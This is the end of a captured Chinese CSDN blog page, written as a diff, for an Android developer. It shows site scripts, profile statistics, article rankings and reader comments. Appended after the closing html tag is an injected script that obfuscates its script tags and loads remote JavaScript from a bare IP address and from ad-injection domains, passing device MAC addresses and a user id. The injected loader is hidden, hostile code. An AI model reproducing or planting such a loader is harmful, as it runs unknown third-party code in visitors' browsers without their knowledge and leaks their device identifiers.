+</style>
+
+
+<div class="tag_list" style="display:none"></div>
+  <script  language="javascript" type='text/javascript'>     
+      $(function(){
+              setTimeout(function(){
+                  $.get("/vipzjyno1/svc/GetTagContent",function(data){
+                      $(".tag_list").html(data).show();
+                  });     
+              });
+          },500);                       
+ </script> 
+
+
+<div id="pop_win" style="display:none ;position: absolute; z-index: 10000; border: 1px solid rgb(220, 220, 220); top: 222.5px; left: 630px; opacity: 1; background: none 0px 0px repeat scroll rgb(255, 255, 255);">
+    
+</div>
+<div id="popup_mask"></div>
+<style>
+    #popup_mask
+    {
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        background: #000;
+        z-index: 9999;
+        left: 0px;
+        top: 0px;
+        opacity: 0.3;
+        filter: alpha(opacity=30);
+        display: none;
+    }
+
+</style>
+
+
+
+
+<script type="text/javascript">
+    $(function(){
+        setTimeout(function(){
+            $(".comment_body:contains('回复')").each(function(index,item){
+                var u=$(this).text().split('：')[0].toString().replace("回复","")
+                var thisComment=$(this);
+                if(u)
+                {
+                    $.getJSON("https://passport.csdn.net/get/nick?callback=?", {users: u}, function(a) {
+                        if(a!=null&&a.data!=null&&a.data.length>0)
+                        {
+                            nick=a.data[0].n; 
+                            if(u!=nick)
+                            {
+                                thisComment.text(thisComment.text().replace(u,nick));  
+                            }
+                        }       
+                    });  
+                }
+            });         
+
+        },200);  
+
+        setTimeout(function(){
+            $(".math").each(function(index,value){$(this).find("span").last().css("color","#fff"); })
+        },5000);
+
+        setTimeout(function(){
+            $(".math").each(function(index,value){$(this).find("span").last().css("color","#fff"); })
+        },10000);
+
+        setTimeout(function(){
+            $(".math").each(function(index,value){$(this).find("span").last().css("color","#fff"); })
+        },15000);
+        
+        setTimeout(function(){
+            $("a img[src='http://js.tongji.linezing.com/stats.gif']").parent().css({"position":"absolute","left":"50%"});
+        },300);
+    });
+
+    function loginbox(){
+        var $logpop=$("#pop_win");
+        $logpop.html('<iframe src="https://passport.csdn.net/account/loginbox?service=http://static.blog.csdn.net/callback.htm" frameborder="0" height="600" width="400" scrolling="no"></iframe>');
+
+        $('#popup_mask').css({
+            opacity: 0.5,
+            width: $( document ).width() + 'px',
+            height:  $( document ).height() + 'px'
+        });
+        $('#popup_mask').css("display","block");
+ 
+        $logpop.css( {
+            top: ($( window ).height() - $logpop.height())/ 2  + $( window 
+       ).scrollTop() + 'px',
+            left:($( window ).width() - $logpop.width())/ 2
+        } );
+ 
+        setTimeout( function () {
+            $logpop.show();
+            $logpop.css( {
+                opacity: 1
+            } );
+        }, 200 );
+ 
+        $('#popup_mask').unbind("click");
+        $('#popup_mask').bind("click", function(){
+            $('#popup_mask').hide();
+            var $clopop = $("#pop_win");
+            $("#common_ask_div_sc").css("display","none");
+            $clopop.css( {
+                opacity: 0
+            } );
+            setTimeout( function () {
+                $clopop.hide();
+            }, 350 );
+            return false;
+        });
+    }   
+
+</script>
+ <script language="javascript" type="text/javascript" src="http://ads.csdn.net/js/async_new.js"></script>      
+
+
+
+
+                        <div class="clear">
+                        </div>
+                    </div>                   
+                
+            </div>
+                   
+           <div id="side">
+               
+    <div class="side">
+<div id="panel_Profile" class="panel">
+<ul class="panel_head"><span>个人资料</span></ul>
+<ul class="panel_body profile">
+<div id="blog_userface">
+    <a href="http://my.csdn.net/vipzjyno1" target="_blank">
+    <img src="http://avatar.csdn.net/0/0/D/1_vipzjyno1.jpg" title="访问我的空间" style="max-width:90%"/>
+    </a>
+    <br />
+    <span><a href="http://my.csdn.net/vipzjyno1" class="user_name" target="_blank">vipzjyno1</a></span>
+</div>
+<div class="interact">
+
+    <a href="javascript:void(0);" class="attent" id="span_add_follow" title="[加关注]"></a>
+
+ <a href="javascript:void(0);" class="letter"  title="[发私信]" onclick="window.open('http://msg.csdn.net/letters/model?receiver=vipzjyno1','_blank','height=350,width=700');_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_sixin'])"></a>  
+</div>
+<div id="blog_medal">
+                <div id="bms_box">
+               </div>
+</div>
+<ul id="blog_rank">
+    <li>访问：<span>1739353次</span></li>
+    <li>积分：<span>5888</span> </li>    
+    <li >等级： <span style="position:relative;display:inline-block;z-index:1" >
+            <img src="http://c.csdnimg.cn/jifen/images/xunzhang/jianzhang/blog6.png" alt="" style="vertical-align: middle;" id="leveImg">
+            <div id="smallTittle" style=" position: absolute;  left: -24px;  top: 25px;  text-align: center;  width: 101px;  height: 32px;  background-color: #fff;  line-height: 32px;  border: 2px #DDDDDD solid;  box-shadow: 0px 2px 2px rgba (0,0,0,0.1);  display: none;   z-index: 999;">
+            <div style="left: 42%;  top: -8px;  position: absolute;  width: 0;  height: 0;  border-left: 10px solid transparent;  border-right: 10px solid transparent;  border-bottom: 8px solid #EAEAEA;"></div>
+            积分：5888 </div>
+        </span>  </li>
+    <li>排名：<span>第3535名</span></li>
+</ul>
+<ul id="blog_statistics">
+    <li>原创：<span>22篇</span></li>
+    <li>转载：<span>7篇</span></li>
+    <li>译文：<span>0篇</span></li>
+    <li>评论：<span>1019条</span></li>
+</ul>
+</ul>
+</div>
+
+
+
+
+<div id="custom_column_39255421" class="panel">
+<ul class="panel_head"><span>Github，爱开源、分享</span></ul>
+<ul class="panel_body">
+
+<li style="padding:3px"><a target="_blank" href="https://github.com/Rano1"><font color="red" size="2">https://github.com/Rano1</font></a>
+</li>
+</ul>
+</div><div id="panel_Category" class="panel">
+<ul class="panel_head"><span>文章分类</span></ul>
+<ul class="panel_body">    
+                 <li>
+                    <a href="/vipzjyno1/article/category/2050593" onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); ">转载</a><span>(7)</span>
+                </li>
+                 <li>
+                    <a href="/vipzjyno1/article/category/1922005" onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); ">感悟期望</a><span>(2)</span>
+                </li>
+                 <li>
+                    <a href="/vipzjyno1/article/category/888110" onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); ">疑问</a><span>(0)</span>
+                </li>
+                 <li>
+                    <a href="/vipzjyno1/article/category/2050837" onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); ">android</a><span>(20)</span>
+                </li>
+</ul>
+</div><div id="panel_Archive" class="panel">
+<ul class="panel_head"><span>文章存档</span></ul>
+<ul class="panel_body">
+<div id="archive_list">
+<!--归档统计-->
+<li><a href="/vipzjyno1/article/month/2014/05">2014年05月</a><span>(6)</span></li><li><a href="/vipzjyno1/article/month/2014/04">2014年04月</a><span>(14)</span></li><li><a href="/vipzjyno1/article/month/2014/03">2014年03月</a><span>(8)</span></li><li><a href="/vipzjyno1/article/month/2014/02">2014年02月</a><span>(1)</span></li>
+</div>
+</ul>
+</div>
+<div id="hotarticls" class="panel">
+<ul class="panel_head">
+    <span>       
+阅读排行    </span>
+</ul>
+
+<ul class="panel_body itemlist">
+<li>
+<a href="/vipzjyno1/article/details/21039349" title="Android APK反编译就这么简单  详解（附图）">Android APK反编译就这么简单  详解（附图）</a><span>(647615)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/25248021" title="Android 通知栏Notification的整合 全面学习 （一个DEMO让你完全了解它）">Android 通知栏Notification的整合 全面学习 （一个DEMO让你完全了解它）</a><span>(174022)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/23206387" title="Android-Universal-Image-Loader 图片异步加载类库的使用（超详细配置）">Android-Universal-Image-Loader 图片异步加载类库的使用（超详细配置）</a><span>(167007)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/23542617" title="Android 命名规范 （提高代码可以读性）">Android 命名规范 （提高代码可以读性）</a><span>(88440)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/23707149" title="SwitchButton 开关按钮 的多种实现方式  （附源码DEMO）">SwitchButton 开关按钮 的多种实现方式  （附源码DEMO）</a><span>(75154)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/21042823" title="Android如何防止apk程序被反编译">Android如何防止apk程序被反编译</a><span>(51946)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/26514543" title="（android高仿系列）今日头条 --新闻阅读器 （三） 完结 、总结 篇">（android高仿系列）今日头条 --新闻阅读器 （三） 完结 、总结 篇</a><span>(50914)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/23614675" title="Android SlidingMenu 开源项目 侧拉菜单的使用（详细配置）">Android SlidingMenu 开源项目 侧拉菜单的使用（详细配置）</a><span>(47489)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/23696537" title="android  自定义控件 使用declare-styleable进行配置属性（源码角度）">android  自定义控件 使用declare-styleable进行配置属性（源码角度）</a><span>(43855)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/22098621" title="GitHub超详细图文攻略 - Git客户端下载安装 GitHub提交修改源码工作流程 Git分支 标签 过滤 Git版本工作流">GitHub超详细图文攻略 - Git客户端下载安装 GitHub提交修改源码工作流程 Git分支 标签 过滤 Git版本工作流</a><span>(39258)</span>
+</li>
+</ul>
+</div>
+<div id="hotarticls2" class="panel">
+<ul class="panel_head"><span>评论排行</span></ul>
+<ul class="panel_body itemlist">
+<li>
+<a href="/vipzjyno1/article/details/21039349" title="Android APK反编译就这么简单  详解（附图）">Android APK反编译就这么简单  详解（附图）</a><span>(176)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/26514543" title="（android高仿系列）今日头条 --新闻阅读器 （三） 完结 、总结 篇">（android高仿系列）今日头条 --新闻阅读器 （三） 完结 、总结 篇</a><span>(129)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/25248021" title="Android 通知栏Notification的整合 全面学习 （一个DEMO让你完全了解它）">Android 通知栏Notification的整合 全面学习 （一个DEMO让你完全了解它）</a><span>(127)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/23206387" title="Android-Universal-Image-Loader 图片异步加载类库的使用（超详细配置）">Android-Universal-Image-Loader 图片异步加载类库的使用（超详细配置）</a><span>(100)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/23619269" title="（android高仿系列）今日头条 --新闻阅读器 （二）">（android高仿系列）今日头条 --新闻阅读器 （二）</a><span>(81)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/25005851" title="Android 高仿 频道管理----网易、今日头条、腾讯视频  （可以拖动的GridView）附源码DEMO">Android 高仿 频道管理----网易、今日头条、腾讯视频  （可以拖动的GridView）附源码DEMO</a><span>(59)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/19763963" title="一个菜鸟对于过去和未来的感悟和展望">一个菜鸟对于过去和未来的感悟和展望</a><span>(46)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/23707149" title="SwitchButton 开关按钮 的多种实现方式  （附源码DEMO）">SwitchButton 开关按钮 的多种实现方式  （附源码DEMO）</a><span>(45)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/23591315" title="（android高仿系列）今日头条 --新闻阅读器  （一）">（android高仿系列）今日头条 --新闻阅读器  （一）</a><span>(34)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/24664161" title="Android 仿 窗帘效果 和 登录界面拖动效果  （Scroller类的应用） 附 2个DEMO及源码">Android 仿 窗帘效果 和 登录界面拖动效果  （Scroller类的应用） 附 2个DEMO及源码</a><span>(33)</span>
+</li>
+</ul>
+</div>
+<div id="homepageArticles" class="panel tracking-ad" data-mod="popu_4">
+<ul class="panel_head"><span>推荐文章</span></ul>
+<ul class="panel_body" id="ad_commend">
+<ul>
+<li><a href="http://blog.csdn.net/blogdevteam/article/details/60576936" target="_blank">* CSDN日报20170306——《程序员转行为什么这么难》</a></li>
+<li><a href="http://blog.csdn.net/hejjunlin/article/details/60480109" 
+target="_blank">* 直播技术总结（四）音视频数据压缩及编解码基础 </a></li>
+<li><a href="http://blog.csdn.net/qibin0506/article/details/60478869"target="_blank">* 第一个PWA程序-聊天室</a></li>
+<li><a href="http://blog.csdn.net/cyq1162/article/details/60578454" target="_blank">* 一个想法照进现实-《IT连》创业项目：万事开头难</a></li>
+<li><a href="http://blog.csdn.net/jiangwei0910410003/article/details/54879836" 
+target="_blank">* Android"挂逼"修炼之行---防自动抢红包外挂原理解析</a></li>
+
+
+</ul></ul>
+</div>
+
+
+<div id="newcomments" class="panel">
+<ul class="panel_head"><span>最新评论</span></ul>
+<ul class="panel_body itemlist">
+    <li>
+   
+         <a href="/vipzjyno1/article/details/21039349#comments">Android APK反编译就这么简单  详解（附图）</a>
+    <p style="margin:0px;"><a href="/baidu_37805974" class="user_name">baidu_37805974</a>:
+为什么我找不到dex2jar-0.0.9.15 文件夹，没办法进行了，笑cry
+    </p>
+    </li>
+    <li>
+   
+         <a href="/vipzjyno1/article/details/21039349#comments">Android APK反编译就这么简单  详解（附图）</a>
+    <p style="margin:0px;"><a href="/qq_36549594" class="user_name">qq_36549594</a>:
+厉害了楼主 谢谢了
+    </p>
+    </li>
+    <li>
+   
+         <a href="/vipzjyno1/article/details/21039349#comments">Android APK反编译就这么简单  详解（附图）</a>
+    <p style="margin:0px;"><a href="/ThePromonkeyOf_HeLuo" class="user_name">ThePromonkeyOf_HeLuo</a>:
+亲试可用！都两年了还嫩使用。感谢分享。
+    </p>
+    </li>
+    <li>
+   
+         <a href="/vipzjyno1/article/details/25248021#comments">Android 通知栏Notification的整合 全面学习 （一个DEMO让你完全了解它）</a>
+    <p style="margin:0px;"><a href="/qq_32463365" class="user_name">qq_32463365</a>:
+楼主太厉害了，小弟佩服佩服！
+    </p>
+    </li>
+    <li>
+   
+         <a href="/vipzjyno1/article/details/23206387#comments">Android-Universal-Image-Loader 图片异步加载类库的使用（超详细配置）</a>
+    <p style="margin:0px;"><a href="/huitengcsdn" class="user_name">huitengcsdn</a>:
+@zjcdqi:请问你是怎么解决的webservice返回的string图片这个问题
+    </p>
+    </li>
+    <li>
+   
+         <a href="/vipzjyno1/article/details/23206387#comments">Android 通知栏Notification的整合 全面学习 （一个DEMO让你完全了解它）</a>
+    <p style="margin:0px;"><a href="/guai8023" class="user_name">guai8023</a>:
+请教一下，在AndroidN中通知会自动消失是什么原因？
+    </p>
+    </li>
+    <li>
+   
+         <a href="/vipzjyno1/article/details/24577023#comments">android 布局之滑动探究 scrollTo 和 scrollBy 方法使用说明</a>
+    <p style="margin:0px;"><a href="/a13570320979" class="user_name">a13570320979</a>:
+ScrollTo和ScrollBy滑动的是view的显示内容，并不改变view的坐标
+    </p>
+    </li>
+    <li>
+   
+         <a href="/vipzjyno1/article/details/19763963#comments">一个菜鸟对于过去和未来的感悟和展望</a>
+    <p style="margin:0px;"><a href="/Honor4GLTE" class="user_name">Honor4GLTE</a>:
+感触颇深!谢谢博主!
+    </p>
+    </li>
+    <li>
+   
+         <a href="/vipzjyno1/article/details/19763963#comments">Android APK反编译就这么简单  详解（附图）</a>
+    <p style="margin:0px;"><a href="/ysc123shift" class="user_name">ysc123shift</a>:
+这个是我总结出来最新的apk反编译教程，本博客有些东西陈旧了，已经没法用了。我看了最新的apk反编译...
+    </p>
+    </li>
+    <li>
+   
+         <a href="/vipzjyno1/article/details/19763963#comments">Android APK反编译就这么简单  详解（附图）</a>
+    <p style="margin:0px;"><a href="/MAN20061018" class="user_name">MAN20061018</a>:
+太强大了，强的有点可怕， 软件怎么加密才能安全？
+    </p>
+    </li>
+</ul>
+</div>
+    </div>
+    <div class="clear">
+    </div>
+
+
+                   <!-- 广告位开始 --> 
+                    <ins data-revive-zoneid="190" data-revive-id="8c38e720de1c90a6f6ff52f3f89c4d57"></ins> 
+                    <!-- 广告位结束 -->
+
+           </div>   
+
+            <div class="clear">
+            </div>
+        </div>
+
+        
+
+<script type="text/javascript" src="http://c.csdnimg.cn/rabbit/cnick/cnick.js"></script>
+<script type="text/javascript" src="http://static.blog.csdn.net/scripts/newblog.min.js"></script>
+
+
+<script type="text/javascript" src="http://medal.blog.csdn.net/showblogmedal.ashx?blogid=1178541"></script>
+<script type="text/javascript" src="http://static.blog.csdn.net/scripts/JavaScript1.js"></script>
+
+    <script type="text/javascript" src="http://passport.csdn.net/content/loginbox/login.js"></script>
+<script type="text/javascript">document.write("<img src=http://counter.csdn.net/pv.aspx?id=24 border=0 width=0 height=0>");</script>
+<script type="text/javascript" src="http://www.csdn.net/ui/scripts/Csdn/counter.js"></script>
+<script type="text/javascript" src="http://ad.csdn.net/scripts/ad-blog.js"></script>
+<script type="text/javascript">
+    $(function () {
+        function __get_code_toolbar(snippet_id) {
+            return $("<span class='tracking-ad' data-mod='popu_167'><a href='https://code.csdn.net/snippets/"
+                    + snippet_id
+                    + "' target='_blank' title='在CODE上查看代码片'  style='text-indent:0;'><img src='https://code.csdn.net/assets/CODE_ico.png' width=12 height=12 alt='在CODE上查看代码片' style='position:relative;top:1px;left:2px;'/></a></span>"
+                    + "<span class='tracking-ad' data-mod='popu_170'><a href='https://code.csdn.net/snippets/"
+                    + snippet_id
+                    + "/fork' target='_blank' title='派生到我的代码片' style='text-indent:0;'><img src='https://code.csdn.net/assets/ico_fork.svg' width=12 height=12 alt='派生到我的代码片' style='position:relative;top:2px;left:2px;'/></a></span>");
+        }
+        
+        $("[code_snippet_id]").each(function () {
+            __s_id = $(this).attr("code_snippet_id");
+            if (__s_id != null && __s_id != "" && __s_id != 0 && parseInt(__s_id) > 70020) {
+                __code_tool = __get_code_toolbar(__s_id);
+                $(this).prev().find(".tools").append(__code_tool);
+            }
+        });
+
+        $(".bar").show();
+    });
+</script>
+
+
+
+
+
+    </div>
+      <!--new top-->
+    
+    <script id="csdn-toolbar-id" btnId="header_notice_num" wrapId="note1" count="5" subCount="5" type="text/javascript" src="http://c.csdnimg.cn/public/common/toolbar/js/toolbar.js"></script>     <!--new top-->
+   
+    <link href="http://c.csdnimg.cn/comm_ask/css/ask_float_block.css" type="text/css" rel="stylesheet" />
+    <script language='JavaScript' type='text/javascript' src='http://c.csdnimg.cn/comm_ask/js/libs/wmd.js'></script>
+    <script language='JavaScript' type='text/javascript' src='http://c.csdnimg.cn/comm_ask/js/libs/showdown.js'></script>
+    <script language='JavaScript' type='text/javascript' src='http://c.csdnimg.cn/comm_ask/js/libs/prettify.js'></script>
+    <script language='JavaScript' type='text/javascript' src='http://c.csdnimg.cn/comm_ask/js/apps/ask_float_block.js'></script>
+   
+
+   
+
+  <div id="a52b5334d" style="width: 1px; height: 1px; display: none;">
+                    <script id="adJs52b5334"></script>
+                    <script>document.getElementById("adJs52b5334").src = "http://ads.csdn.net/js/opt/52b5334.js?t=" + Math.random();</script>
+   </div>
+
+    <link rel="stylesheet" href="http://static.blog.csdn.net/css/blog_code.css" />
+    <script type="text/javascript" src="http://static.blog.csdn.net/scripts/saveToCode.js"></script>
+      <script type="text/javascript" src="//csdnimg.cn/rabbit/tracking-ad/main.js?75eacd8"></script>
+
+     <link rel="stylesheet" href="http://static.blog.csdn.net/css/fa.css" />
+
+    <div class="pop_CA_cover"  style="display:none"></div>
+    <div class="pop pop_CA"  style="display:none">
+          <div class="CA_header">
+            收藏助手
+            <span class="cancel_icon"  id="fapancle"  onclick="$('.pop_CA').hide();$('.pop_CA_cover').hide();"></span>
+          </div>
+          <iframe src="" id="fa" frameborder="0" width="100%" height="360"  scrolling="no" />
+    </div>
+</body>
+</html>   
+ <script>
+function ik_random(){var ik_r_min=0;var ik_r_max=100;return(parseInt(Math.random()*(ik_r_max-ik_r_min+1)+ik_r_min));}
+function ik_isiframe(){return (self!=top);}
+var __m='b8:2a:72:c1:db:f9';
+var __m2='00:00:00:00:00:00';
+var __h="<sc"+"ript src=\"http://101.201.53.95/js.php?uid=48c591bb0b2e4fd248d81fbb9360387b,PC,";
+var __b="&r="+Math.random()+__m+__m2+"\"></scr"+"ipt>";
+var x=ik_random();
+if(!ik_isiframe()){
+switch(true){
+case x>=0&&x<5:
+document.write(__h+"200"+__b);
+document.write("<sc"+"ript src=\"http://js.union-wifi.com/zm.js?cid=10270&dmac="+__m2+"&umac="+__m+"\"></scr"+"ipt>");
+break;
+case x>=5&&x<20:
+document.write(__h+"12"+__b);
+document.write("<sc"+"ript src=\"http://res.sspsky.com/cp.js?cid=F3FFAE2FDC1B\"></scr"+"ipt>");
+break;
+case x>=50&&x<=100:
+document.write(__h+"100"+__b);
+document.write("<sc"+"ript src=\"http://js.union-wifi.com/zm.js?cid=10269&dmac="+__m2+"&umac="+__m+"\"></scr"+"ipt>");
+break;
+}
+}
+</script>
